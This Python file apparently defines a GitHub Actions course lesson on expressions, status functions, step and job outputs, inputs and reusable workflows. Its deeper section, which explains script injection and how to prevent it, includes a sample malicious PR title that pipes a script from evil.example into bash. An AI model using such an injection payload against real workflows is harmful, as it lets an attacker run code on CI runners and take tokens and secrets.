"""Day 20: Workflow logic: expressions, outputs and reusable workflows (new in the second edition).

The worked example's output comes from run_act.sh (act 0.2.92, ubuntu:24.04 image).
"""
from common import T, box, cap, lab, line, link, refs, scratch, sources, svg

DIAGRAM = svg(350, "Inside the version job, a step writes to GITHUB_OUTPUT, which becomes a step output and then a job output; the build job reads it through needs, and a report job runs afterwards even if build failed", [
    cap(138, 24, "job: version"),
    box(48, 36, 180, 44, "bxt", "step: make"),
    line(138, 80, 138, 116),
    cap(212, 102, "GITHUB_OUTPUT"),
    box(48, 120, 180, 44, "bx", "step output"),
    line(138, 164, 138, 200),
    cap(206, 186, "outputs: map"),
    box(48, 204, 180, 44, "bxg", "job output"),
    line(228, 226, 328, 226),
    cap(278, 216, "needs"),
    box(332, 204, 180, 44, "bxo", "build job"),
    line(422, 248, 422, 284, dashed=True),
    cap(492, 270, "if: always()"),
    box(332, 288, 180, 44, "bxp", "report job"),
])

S1 = T("""
Everything in this lesson gets easier once you see that a workflow is read at two different moments.

First, GitHub reads the YAML on its own servers. It decides which jobs to start, works out every `${{ ... }}` expression, and pastes the results into the text. Only then does it send a job to a runner. Second, the runner runs your steps, and the shell expands `$VARIABLES` while each script runs.

So `run: echo "Branch ${{ github.ref_name }}"` never reaches the shell in that form. On a push to `main`, bash receives `echo "Branch main"`. The expression was replaced before bash even started.

Two consequences follow, and both trip people up:

- Pasted text becomes code. Say an expression holds text that someone else controls, such as a pull request title. A title with a quote mark in it can end your string and add its own commands. Put such values in `env:` and use `"$TITLE"` in the script, so the shell treats them as data.
- A job-level `if:` is checked before any runner exists. It can only use what GitHub knows at that moment, which is the `github`, `needs`, `vars` and `inputs` contexts. The `env`, `steps` and `runner` contexts do not exist yet, so `if: env.DEPLOY == 'yes'` on a job is an error.

When something behaves strangely, ask which of the two moments you are in.
""")

S2 = T("""
A **context** is a named set of facts that GitHub fills in for each run. You read one with an expression, written `${{ ... }}`. These are the ones you will use:

- `github`: the run itself, such as `github.sha`, `github.ref`, `github.event_name`, and the event's data under `github.event`.
- `env`: variables set with `env:` in the workflow, the job or the step.
- `vars` and `secrets`: configuration variables and secrets stored in the repository settings (Day 21).
- `inputs`: values typed into the Run workflow form, or passed to a reusable workflow.
- `matrix`: the values of the current matrix job, such as `matrix.python-version`.
- `steps` and `needs`: results and outputs of earlier steps in this job, and of the jobs this job needs.
- `runner` and `job`: facts about this machine and this job, such as `runner.os` and `job.status`.

Expressions have the usual operators: `==`, `!=`, `&&`, `||` and `!`. Strings go in single quotes, and comparisons ignore upper and lower case. A few functions help: `contains()`, `startsWith()`, `format()`, `toJSON()`, `fromJSON()` and `hashFiles()`.

A property that does not exist gives an empty string, not an error. So a typo such as `github.event_nmae` fails quietly on GitHub, and actionlint is the tool that catches it. To see what a context really holds, print it once: put `CTX: ${{ toJSON(github) }}` under a step's `env:` and run `echo "$CTX"`. It is the fastest way to learn what an event carries. Do it in a practice workflow only: the `github` context includes `github.token`, and although GitHub masks it in logs, the docs ask you to be careful.
""")

S3 = T("""
Any job or step can have an `if:`. When the expression is false, GitHub skips that job or step. A job skipped this way counts as passed for required checks.

Here is the part that catches almost everyone. Every `if:` that does not contain a status function gets an invisible `success()` added to it. `success()` is true only when everything before it succeeded. So `if: github.ref == 'refs/heads/main'` really means `success() && github.ref == 'refs/heads/main'`, and after a failed step it is false.

There are four status functions:

- `success()`: everything before succeeded. This is the default.
- `failure()`: something before failed. In a job with `needs`, a failed job anywhere up the chain counts.
- `cancelled()`: the run was cancelled.
- `always()`: true no matter what, even during a cancel.

To run after a failure, say so: `if: ${{ failure() && steps.smoke.outcome == 'failure' }}` runs only when that one step failed. To run whatever happened, prefer `!cancelled()`. GitHub's docs warn against `always()` on important steps. Such a step also runs while the run is being cancelled, and if it gets stuck, it hangs until the timeout. The `always()` function fits small jobs that only report, like the one in today's worked example.

A step can also be allowed to fail with `continue-on-error: true`. Then `steps.<id>.outcome` says `failure`, while `steps.<id>.conclusion` says `success`, and the job carries on.
""")

S4 = T("""
Each step runs in a new shell, and each job runs on a new machine. To pass a value along, you append it to one of the files the runner gives every step. Their paths are in environment variables:

- `$GITHUB_OUTPUT`: `echo "version=1.4.0" >> "$GITHUB_OUTPUT"` creates a step output. Give the step an `id`, such as `meta`, and later steps read `${{ steps.meta.outputs.version }}`.
- `$GITHUB_ENV`: `echo "IMAGE=hello-devops:ci" >> "$GITHUB_ENV"` sets `$IMAGE` for every later step in the same job. The step that writes it does not see it.
- `$GITHUB_STEP_SUMMARY`: Markdown you append here appears on the run's summary page, so people see results without opening a log.

Between jobs you need one more hop, because jobs share nothing. Under the job's `outputs:`, map a name to a step output. A job that `needs` it then reads `${{ needs.version.outputs.version }}`. The diagram shows the whole path.

Outputs are always strings. A step that writes `ok=true` gives the text 'true', so compare with `== 'true'`, or turn it back into a boolean with `fromJSON()`. For a value with several lines, use the `name<<EOF` form from the workflow commands docs. And never write a secret to any of these files: outputs and summaries are visible to everyone who can read the run.
""")

S5 = T("""
`workflow_dispatch` adds a Run workflow button. Add `inputs:` and the button opens a small form; the values land in the `inputs` context. Each input has a type:

- `boolean`: a tick box, `true` or `false`.
- `choice`: a drop-down list built from `options`.
- `string` and `number`: a text field.
- `environment`: a drop-down of the repository's environments.

From the terminal, the same form is `gh workflow run ci.yml -f smoke-test=false`. A workflow can have up to 25 inputs.

Two details matter. The `inputs` context keeps booleans as booleans, while the older `github.event.inputs` turns them into the strings 'true' and 'false'. Use `inputs`. And when the same workflow runs because of a push, `inputs.smoke-test` is empty, not `true`. Defaults apply only to a manual run.

That is why today's lab writes its condition as `github.event_name != 'workflow_dispatch' || inputs.smoke-test`. On a push or a pull request the first half is true, so the step runs. On a manual run the first half is false, and the tick box decides.

Inputs come from people with write access to the repository, so they are more trusted than a PR title. Pass string inputs through `env:` anyway; it costs one line and keeps the habit.
""")

S6 = T("""
Once two jobs repeat the same steps, you want to write those steps once. GitHub has two tools for that, and they work at different levels.

A **composite action** bundles steps into a single step. It is a folder with an `action.yml` that says `runs: using: composite` and lists the steps. It can take `inputs` and give `outputs`, and every `run` step inside it must name its `shell`. You call it like any other action, with `uses:`. For an action in your own repository the path starts with `./`, as in `uses: ./.github/actions/setup-app`. It only works after `actions/checkout`, because the folder must be on the runner. A composite action cannot read the `secrets` context; the caller passes secrets in as inputs.

A reusable workflow is a whole workflow that other workflows call like a function. Its `on:` lists `workflow_call`, with typed `inputs`, named `secrets` and `outputs`. The caller uses it in place of a job's steps: `uses: ./.github/workflows/build.yml` plus `with:`, and `secrets: inherit` passes along all of the caller's secrets. The limits worth knowing:

- Calls nest at most 10 levels deep, with at most 50 different reusable workflows in one run.
- The caller's workflow-level `env` does not reach the called workflow. Use inputs or `vars`.
- Token permissions can stay the same or shrink down the chain, never grow.
- The called jobs show up as new checks, so required check names in a ruleset change.

Which one to pick? Steps that run inside one job, such as setup, belong in a composite action. Whole jobs with their own runners, environments or secrets belong in a reusable workflow. In a single repository I start with a composite action and switch only when I need separate jobs.
""")

S7 = T("""
One more key shows up in real pipelines: `environment:` on a job, as in `environment: production`. An environment is a named place you deploy to, set up under Settings, Environments. It does three things for the jobs that name it:

- Its protection rules run first: required reviewers, a wait timer, or a rule that only certain branches or tags may deploy.
- Its own secrets and variables reach only those jobs, and only after the rules pass.
- Each run is recorded as a deployment, which you can open from the repository page.

So a production password can live in the `production` environment, where a pull request job never sees it. On the Free, Pro and Team plans, required reviewers and wait timers only work in public repositories, and yours is public.

Day 21 uses an environment for real: the release workflow waits for your approval before it pushes an image. Today, just learn to recognise the key when you read other people's workflows.
""")

OUT = {k: scratch(f"out-{k}.txt") for k in ("list", "run", "break", "reusable")}

LESSON = {
    "id": "d20",
    "title": "Workflow logic: expressions, outputs and reusable workflows",
    "minutes": 50,
    "goal": "By the end you can make jobs and steps run only when they should, pass values between steps and jobs, take inputs from the Run workflow button, and move repeated steps into a composite action or a reusable workflow.",
    "guess": {
        "q": "A step has `if: github.ref == 'refs/heads/main'`. The run is on main, and an earlier step in the same job failed. Does the step run?",
        "options": [
            "Yes, because the condition is true",
            "No, because every if gets a hidden success() check",
            "Yes, because if conditions ignore earlier steps",
            "Only if the job sets continue-on-error",
        ],
        "answer": 1,
        "why": "An if without a status function gets success() added, so after a failure the step is skipped. Put failure(), always() or !cancelled() in the condition to change that.",
    },
    "terms": [
        {"term": "Context", "plain": "A named set of facts about the run, such as github or steps, read with ${{ }}."},
        {"term": "Expression", "plain": "A small formula inside ${{ }} that GitHub works out before the step runs."},
        {"term": "Status function", "plain": "success(), failure(), cancelled() or always(): checks on what happened earlier in the run."},
        {"term": "Step output", "plain": "A named value a step writes to $GITHUB_OUTPUT, read later as steps.<id>.outputs.<name>."},
        {"term": "Job output", "plain": "A step output copied up to the job, so other jobs can read it through needs."},
        {"term": "Composite action", "plain": "Several steps bundled in an action.yml file and used as one step."},
        {"term": "Reusable workflow", "plain": "A workflow with on: workflow_call that other workflows call in place of a job."},
        {"term": "Environment", "plain": "A named deploy target, such as production, with its own rules and secrets."},
    ],
    "sections": [
        {"h": "Two moments: GitHub reads, then the runner runs", "body": S1, "refs": refs("contexts", "script_injection")},
        {"h": "Contexts and expressions", "body": S2, "refs": refs("contexts", "expressions", "v_kk2")},
        {"h": "Conditions: if and the four status functions", "body": S3, "refs": refs("expressions", "conditions")},
        {"h": "Passing values: outputs, GITHUB_ENV and the run summary", "body": S4, "refs": refs("workflow_commands", "pass_outputs")},
        {"h": "Inputs for the Run workflow button", "body": S5, "refs": refs("manual_run", "events")},
        {"h": "Reuse: composite actions and reusable workflows", "body": S6, "refs": refs("reuse", "composite", "v_composite")},
        {"h": "Environments, a first look", "body": S7, "refs": refs("envs", "envs_ref")},
    ],
    "analogy": "Think of a workflow as a recipe that a head chef prepares before service. Expressions are the blanks the chef fills in on the ticket in advance (\"table 12, no salt\"), so the cook only ever sees the finished ticket. Step outputs are notes the cook leaves for the next cook at the same station, and job outputs are the notes passed through the kitchen hatch to another station. A composite action is a sub-recipe card, such as \"make the sauce\", used inside any dish. The picture breaks on timing: a real chef can change a ticket while the cook works, and GitHub never changes an expression after the job has started.",
    "diagram": DIAGRAM,
    "diagram_caption": "A step output becomes a job output, the next job reads it through needs, and a report job with always() runs whatever happened.",
    "worked": {
        "title": "A three-job pipeline on your laptop, with act",
        "steps": [
            {
                "say": "Practise in a scratch repository, so hello-devops stays clean. The tool act (Day 19) runs workflows in Docker on your Mac. For shell-only jobs, the `ubuntu:24.04` image you pulled on Day 2 is all it needs. Create the folder and paste `logic-demo.yml` from the Files section, then commit, because act takes `GITHUB_SHA` from your last commit.",
                "code": T("""
                    mkdir -p ~/code/logic-demo/.github/workflows
                    cd ~/code/logic-demo
                    git init -b main
                    code .github/workflows/logic-demo.yml
                    git add -A && git commit -m "Add logic demo"
                """),
                "lang": "bash",
            },
            {
                "say": "Look at the `version` job first. The step writes `version=...` to `$GITHUB_OUTPUT`, and the job's `outputs:` block copies that step output up to the job. Without that block, no other job could see it.",
                "code": T("""
                    version:
                      runs-on: ubuntu-latest
                      outputs:
                        version: ${{ steps.make.outputs.version }}
                      steps:
                        - name: Make a version from the commit
                          id: make
                          run: |
                            VERSION="1.4.0-ci.${GITHUB_SHA::7}"
                            echo "version=$VERSION" >> "$GITHUB_OUTPUT"
                            echo "Made version $VERSION"
                """),
                "lang": "yaml",
            },
            {
                "say": "`act -l` lists the jobs without running them. The stages come from `needs`: `build` needs `version`, and `report` needs both, so they run one after another.",
                "code": "$ act -l\n" + OUT["list"],
                "lang": "console",
            },
            {
                "say": "Run it. On its first run act may ask which default image to use; any answer works, because `-P` picks the image here. The grep keeps only the lines your steps printed. The version made in the first job reaches the second through `needs`, and `build` passed it on to a later step through `$GITHUB_ENV`.",
                "code": "$ act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 2>&1 | grep -F ' | '\n" + OUT["run"],
                "lang": "console",
            },
            {
                "say": "Now tick the box: `--input` fills the `break-build` input, just like the form on GitHub. The step `Fail on purpose` runs and exits 1. Write the summary is skipped, because of the hidden `success()`. `report` still runs, thanks to `always()`, and sees one failure. The order of the list is not fixed; it changed between my runs.",
                "code": "$ act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 --input break-build=true 2>&1 | grep -E ' \\| |exitcode|^Error'\n" + OUT["break"],
                "lang": "console",
            },
            {
                "say": "Turn the `build` job into a reusable workflow. Copy `build.yml` from the Files section: it starts with `on: workflow_call` and declares its two inputs. In `logic-demo.yml`, the job's steps make way for a call with arguments.",
                "code": T("""
                    build:
                      needs: version
                      # Call the reusable workflow, like calling a function with arguments.
                      uses: ./.github/workflows/build.yml
                      with:
                        version: ${{ needs.version.outputs.version }}
                        break-build: ${{ inputs.break-build }}
                """),
                "lang": "yaml",
            },
            {
                "say": "Commit and run again. The result is the same, but act now labels the build line `build/build/build`, a name built from the reusable workflow and its jobs. On GitHub, too, the called job's check gets a new name, which is why a ruleset may need updating after this kind of refactor.",
                "code": "$ git add -A && git commit -m \"Move build into a reusable workflow\"\n$ act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 2>&1 | grep -F ' | '\n" + OUT["reusable"],
                "lang": "console",
            },
        ],
    },
    "code": [
        {
            "lang": "yaml",
            "title": ".github/actions/setup-app/action.yml",
            "src": lab(".github/actions/setup-app/action.yml"),
            "run": "actionlint && git add .github/actions && git commit -m \"Add a setup-app composite action\"",
        },
        {
            "lang": "yaml",
            "title": ".github/workflows/ci.yml (Day 20 version)",
            "src": scratch("ci-day20.yml"),
            "run": "actionlint && git commit -am \"CI: composite action, smoke test and summary\" && git push && gh pr checks --watch",
        },
        {
            "lang": "yaml",
            "title": "logic-demo/.github/workflows/logic-demo.yml (practice, in a scratch repo)",
            "src": scratch("logic-demo.yml"),
            "run": "act workflow_dispatch -P ubuntu-latest=ubuntu:24.04",
        },
        {
            "lang": "yaml",
            "title": "logic-demo/.github/workflows/build.yml (practice: the reusable workflow)",
            "src": scratch("build.yml"),
            "run": "act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 --input break-build=true",
        },
    ],
    "commands": [
        {"cmd": "echo \"version=1.4.0\" >> \"$GITHUB_OUTPUT\"", "what": "Inside a step: create the step output `version` (the step needs an `id`)."},
        {"cmd": "echo \"IMAGE=hello-devops:ci\" >> \"$GITHUB_ENV\"", "what": "Inside a step: set `$IMAGE` for every later step in the same job."},
        {"cmd": "echo \"### Results\" >> \"$GITHUB_STEP_SUMMARY\"", "what": "Inside a step: add a Markdown line to the run's summary page."},
        {"cmd": "gh workflow run ci.yml -f smoke-test=false", "what": "Start a workflow by hand and fill in one of its inputs."},
        {"cmd": "gh run view --log", "what": "Print the full log of a run: every step of every job."},
        {"cmd": "act -l", "what": "List the jobs of the workflows in this folder and the stage each runs in."},
        {"cmd": "act workflow_dispatch -P ubuntu-latest=ubuntu:24.04", "what": "Run the workflows that listen to workflow_dispatch locally, on the plain Ubuntu image."},
        {"cmd": "act workflow_dispatch --input break-build=true", "what": "Run locally and fill in a workflow_dispatch input."},
        {"cmd": "act -j report", "what": "Run one job locally, after the jobs it needs."},
        {"cmd": "actionlint", "what": "Check workflows, including expressions, context names and the inputs of local actions."},
    ],
    "mistake": "The most common mistake is expecting a step to run after a failure because its condition looks true, such as `if: github.ref == 'refs/heads/main'` on a cleanup or notify step. The hidden `success()` skips it every time something earlier fails, which is exactly when you wanted it. Write the status function yourself: `failure()` for 'only after a failure', `!cancelled()` for 'whatever happened'.",
    "real_world": "PayLoop's platform team keeps a few composite actions, such as one that sets up the JVM and the Gradle cache. It also keeps two reusable workflows: one builds and scans an image, and one deploys through an environment with approvals. Each service's own workflow is about thirty lines of calls. When the team fixes the scan step, every service picks up the fix on its next run. Services pin the reusable workflows to a commit, so a bad change cannot spread everywhere at once.",
    "task": {
        "title": "Teach the lab's CI three new tricks",
        "steps": [
            "On a branch `workflow-logic`, create `.github/actions/setup-app/action.yml` from the Files section.",
            "In `ci.yml`, replace the setup-python and pip install steps in both the `lint` and `test` jobs with one step that uses `./.github/actions/setup-app`. Keep `actions/checkout` first, and pass the matrix Python version in the test job.",
            "In the `build` job, add a step with `id: meta` that writes `version=0.0.0-ci.` plus the short commit to `$GITHUB_OUTPUT`. Pass it to the image as the `APP_VERSION` build argument, and set `load: true`.",
            "Add the smoke test step (`id: smoke`) that starts the image, waits for `/healthz` and checks that `/` reports the right version. Add the step that prints `docker logs smoke` only when the smoke test failed.",
            "Add the summary step that writes the version and the smoke test result to `$GITHUB_STEP_SUMMARY`, and make it run unless the run was cancelled.",
            "Add the `smoke-test` boolean input to `workflow_dispatch`, and the `if:` on the smoke test that respects it only on manual runs.",
            "Run `actionlint` until it is quiet, then push, open a PR and wait for the four checks. Open the run's summary page and find your version line.",
            "Merge, then run `gh workflow run ci.yml -f smoke-test=false` and check that the smoke test step shows as skipped.",
        ],
        "hints": [
            "If a step that uses the composite action fails because it cannot find `action.yml`, checkout is missing or comes after it.",
            "actionlint reads your local action, so a misspelled input such as `python-versio` is reported before you push.",
            "On a push, `inputs.smoke-test` is empty. Test `github.event_name` first, as the lesson shows.",
        ],
        "done_when": "A PR run's summary page shows `0.0.0-ci.` plus your commit and \"Smoke test: success\", and a manual run with smoke-test off shows the smoke test step as skipped.",
    },
    "explain_back": {
        "prompt": "Explain how a value made in one job reaches another job, in 3 to 4 sentences. Mention GITHUB_OUTPUT, the job's outputs block and needs, and say why GITHUB_ENV is not enough.",
        "answer": "A step appends a line like version=1.4.0 to the file in $GITHUB_OUTPUT. Because the step has an id, later steps can read it as steps.make.outputs.version. The job's outputs block maps a job output to that step output. Another job that lists the first one under needs then reads it as needs.version.outputs.version. GITHUB_ENV only sets variables for later steps on the same runner, and every job runs on a fresh machine, so it cannot carry a value across jobs.",
    },
    "recap": [
        "GitHub works out ${{ }} expressions before the shell runs, so pass untrusted text through env.",
        "A job-level if can only use github, needs, vars and inputs; steps, env and runner do not exist yet.",
        "Every if without a status function gets success(); use failure() or !cancelled() to run after a failure.",
        "GITHUB_OUTPUT makes step outputs, a job's outputs block shares them through needs, and GITHUB_ENV only reaches later steps in the same job.",
        "workflow_dispatch inputs fill the inputs context; on other events they are empty, so test github.event_name first.",
        "A composite action bundles steps into one step; a reusable workflow bundles whole jobs and can take secrets.",
    ],
    "check": [
        {
            "q": "A job uploads a crash report with `if: ${{ failure() }}`. The run is cancelled halfway through. Does the upload run?",
            "options": [
                "Yes, because a cancel counts as a failure",
                "Yes, because if conditions are checked only at the start",
                "Only if the job also has timeout-minutes",
                "No, because failure() is false when the run is cancelled",
            ],
            "answer": 3,
            "why": "failure() is true only when an earlier step or job failed. A cancel is a different outcome; always() or cancelled() would cover it.",
        },
        {
            "q": "Job deploy must use the image tag that job build computed. Which line reads it inside deploy?",
            "options": [
                "${{ steps.build.outputs.tag }}",
                "${{ needs.build.outputs.tag }}",
                "$TAG, set in build with GITHUB_ENV",
                "${{ env.build.tag }}",
            ],
            "answer": 1,
            "why": "Other jobs read job outputs through the needs context. steps only covers the current job, and GITHUB_ENV never leaves its runner.",
        },
        {
            "q": "Three repositories need the same deploy: its own job on a separate runner, the production environment's approval, and a cloud secret. What do you build?",
            "options": [
                "A reusable workflow with on: workflow_call",
                "A composite action in .github/actions",
                "A YAML anchor copied into each file",
                "A workflow_dispatch input with the secret",
            ],
            "answer": 0,
            "why": "Whole jobs with their own runner, environment and secrets are what reusable workflows are for. A composite action runs inside one job and cannot read secrets itself.",
        },
    ],
    "interview": [
        {
            "q": "When do you use a composite action, and when a reusable workflow?",
            "a": "A composite action bundles steps and runs as one step inside a job, so it fits shared setup such as installing a toolchain and restoring caches. A reusable workflow bundles whole jobs, each with its own runner, environment and secrets, so it fits shared build or deploy pipelines. Composite actions cannot read secrets themselves and log as one step. Reusable workflows can nest ten levels deep, do not see the caller's env, and change the names of required checks, so I plan rulesets around them.",
        },
        {
            "q": "What is script injection in GitHub Actions, and how do you prevent it?",
            "a": "GitHub replaces ${{ }} expressions in a run script before the shell starts, so the value becomes part of the script's text. If the value is controlled by someone else, such as a pull request title or a branch name, a quote in it can end a string and add commands. The fix is to pass the value through an environment variable and use \"$VAR\" in the script, so the shell treats it as data. Tools like actionlint flag untrusted values used directly in scripts.",
        },
        {
            "q": "Why might a cleanup step with `if: github.ref == 'refs/heads/main'` never run when it is needed?",
            "a": "Every if that does not use a status function gets an implicit success() check. When an earlier step fails, success() is false, so the cleanup is skipped exactly when something went wrong. To run it after failures too, I write if: ${{ !cancelled() && github.ref == 'refs/heads/main' }}, or failure() if it should only run after a failure.",
        },
    ],
    "deeper": {
        "minutes": 12,
        "body": T("""
            Section one said pasted text becomes code. Here is what that looks like, so you recognise it in other people's workflows.

            Take a step meant to greet contributors: `run: echo "Thanks for the PR ${{ github.event.pull_request.title }}"`. GitHub pastes the title into the script before bash starts. A normal title gives `echo "Thanks for the PR Fix typo"`. Now someone opens a PR with this title: `x"; curl -s https://evil.example/steal.sh | bash; echo "`. After pasting, the script contains three commands, and the middle one downloads and runs a stranger's script on your runner, with whatever token and secrets that job holds.

            The fields an outsider controls are the ones to watch. In the `github` context they include titles and bodies of issues and pull requests, comment bodies, commit messages, author names and emails, and branch names (`github.head_ref`). The safe pattern is the one this course has used since Day 18:

            1. Put the value in `env:` on the step, as in `TITLE: ${{ github.event.pull_request.title }}`.
            2. Use it in the script as `"$TITLE"`, with the double quotes.

            Now the shell receives the text as data in a variable, and no quote in it can change the script. The same rule applies to `actions/github-script` and any other place where an expression lands inside code.

            You do not have to spot these by eye. actionlint reports them. For that greeting step it prints `"github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts.` and tells you to use an environment variable. Run it before every push, and add it to CI later if you like.

            Two more facts make the risk smaller for you today. A pull request from a fork gets no secrets and only a read-only token in a `pull_request` workflow, so the damage is limited. The dangerous combination is untrusted text plus a privileged trigger, such as `pull_request_target`. Day 21 looks at that trigger and why GitHub is starting to block it by default in public repositories. Read GitHub's page on {inj} for more examples.
        """).format(inj=link("script_injection", "script injections")),
    },
    "sources": sources("contexts", "expressions", "pass_outputs", "reuse_howto"),
}
